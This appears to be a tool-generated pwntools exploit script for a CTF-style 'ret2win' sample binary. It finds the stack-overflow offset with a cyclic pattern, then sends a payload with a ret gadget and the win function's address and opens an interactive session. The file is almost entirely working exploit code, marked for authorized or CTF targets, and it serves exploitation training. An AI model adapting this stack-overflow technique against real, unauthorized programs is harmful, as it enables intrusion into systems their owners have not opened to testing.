#!/usr/bin/env python3
# binoracle-generated exploit skeleton
# target: samples/bin/ret2win
# mitigations: NX=true PIE/PIC=false canary=false arch=amd64
# NOTE: template for an AUTHORIZED target (your own / CTF). Fill in the payload.
from pwn import *

context.update(arch='amd64', os='linux')
elf = context.binary = ELF('samples/bin/ret2win')
# libc = ELF('./libc.so.6')  # uncomment for ret2libc

OFFSET = 72

def start():
    if args.REMOTE:
        return remote('HOST', 1337)
    return process(elf.path)

# NX on: no stack shellcode -> ROP / ret2libc

def find_offset():
    """Send a De Bruijn pattern, read the crashing address, and use
    binoracle cyclic_offset (or pwn cyclic_find) to get OFFSET."""
    io = process(elf.path)
    io.sendline(cyclic(2000))
    io.wait()
    core = io.corefile
    log.info("crash at %#x", core.fault_addr)
    log.info("offset = %d", cyclic_find(core.fault_addr))
    io.close()

def exploit():
    io = start()
    assert OFFSET is not None, "set OFFSET first (run find_offset)"
    ret_gadget = next(elf.search(asm('ret'), executable=True), 0)  # 16B align
    payload = flat({
        OFFSET: [
            ret_gadget, 0x401176,  # ret2win: found statically (0x401176)
        ]
    })
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
